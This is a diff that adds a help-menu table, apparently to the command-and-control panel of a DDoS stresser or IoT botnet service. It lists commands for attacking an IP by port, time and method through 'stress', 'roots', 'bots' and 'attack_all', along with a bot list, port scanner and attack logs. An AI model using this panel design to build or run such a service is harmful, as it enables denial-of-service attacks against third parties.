@@ -1,5 +1,26 @@
---------------------------------------
-|                                    |
-|                                    |
-|                                    |
---------------------------------------
+   {WHITE}╔═════════════╦═════════════════╦════════════════════════════════════════╗
+   ║ {YELLOW}Command{WHITE}     ║ {YELLOW}Description{WHITE}     ║ {YELLOW}Command Usage{WHITE}                          ║
+   ╠═════════════╬═════════════════╬════════════════════════════════════════╣
+   ║ {YELLOW}Help{WHITE}        ║ {YELLOW}List of Cmds{WHITE}    ║ {YELLOW}help | ?{WHITE}                               ║
+   ║ {YELLOW}Clear{WHITE}       ║ {YELLOW}Clear Screen{WHITE}    ║ {YELLOW}clear | cls{WHITE}                            ║
+   ║ {YELLOW}Username{WHITE}    ║ {YELLOW}account name{WHITE}    ║ {YELLOW}whoami{WHITE}                                 ║
+   ║ {YELLOW}Info{WHITE}        ║ {YELLOW}Show Acc Info{WHITE}   ║ {YELLOW}info{WHITE}                                   ║
+   ║ {YELLOW}Change PW{WHITE}   ║ {YELLOW}Change password{WHITE} ║ {YELLOW}passwd{WHITE}                                 ║
+   ║ {YELLOW}Methods{WHITE}     ║ {YELLOW}Method list{WHITE}     ║ {YELLOW}methods{WHITE}                                ║
+   ║ {YELLOW}GeoIP{WHITE}       ║ {YELLOW}Lookup an IP{WHITE}    ║ {YELLOW}geo <ip>{WHITE}                               ║
+   ║ {YELLOW}Port Scan{WHITE}   ║ {YELLOW}Port Scanner{WHITE}    ║ {YELLOW}pscan <ip>{WHITE}                             ║
+   ║ {YELLOW}DNS Resolve{WHITE} ║ {YELLOW}DNS Resolver{WHITE}    ║ {YELLOW}dns <URL>{WHITE}                              ║
+   ║ {YELLOW}Stresser{WHITE}    ║ {YELLOW}Attack an IP{WHITE}    ║ {YELLOW}stress <ip> <port> <time> <method>{WHITE}     ║
+   ║ {YELLOW}Root/Spoofs{WHITE} ║ {YELLOW}Attack an IP{WHITE}    ║ {YELLOW}roots <ip> <port> <time> <method>{WHITE}      ║
+   ║ {YELLOW}Bots{WHITE}        ║ {YELLOW}Attack an IP{WHITE}    ║ {YELLOW}bots <ip> <port> <time> <method>{WHITE}       ║
+   ║ {YELLOW}Attack all{WHITE}  ║ {YELLOW}Attack an IP{WHITE}    ║ {YELLOW}attack_all <ip> <port> <time> <method>{WHITE} ║
+   ║ {YELLOW}Users{WHITE}       ║ {YELLOW}Online users{WHITE}    ║ {YELLOW}users{WHITE}                                  ║
+   ║ {YELLOW}ioT{WHITE}         ║ {YELLOW}List of bots{WHITE}    ║ {YELLOW}iot{WHITE}                                    ║
+   ║ {YELLOW}Message{WHITE}     ║ {YELLOW}Send a message{WHITE}  ║ {YELLOW}msg <user> <msg>{WHITE}                       ║
+   ║ {YELLOW}Ticket{WHITE}      ║ {YELLOW}Submit a ticket{WHITE} ║ {YELLOW}ticket <msg>{WHITE}                           ║
+   ║ {YELLOW}Logs{WHITE}        ║ {YELLOW}All acc logs{WHITE}    ║ {YELLOW}logs{WHITE}                                   ║
+   ║ {YELLOW}attacks{WHITE}     ║ {YELLOW}All attack logs{WHITE} ║ {YELLOW}attacks{WHITE}                                ║
+   ║ {YELLOW}logins{WHITE}      ║ {YELLOW}All login logs{WHITE}  ║ {YELLOW}logins{WHITE}                                 ║
+   ║ {YELLOW}admin{WHITE}       ║ {YELLOW}Admin cmd list{WHITE}  ║ {YELLOW}admin{WHITE}                                  ║
+   ╚═════════════╩═════════════════╩════════════════════════════════════════╝
+   
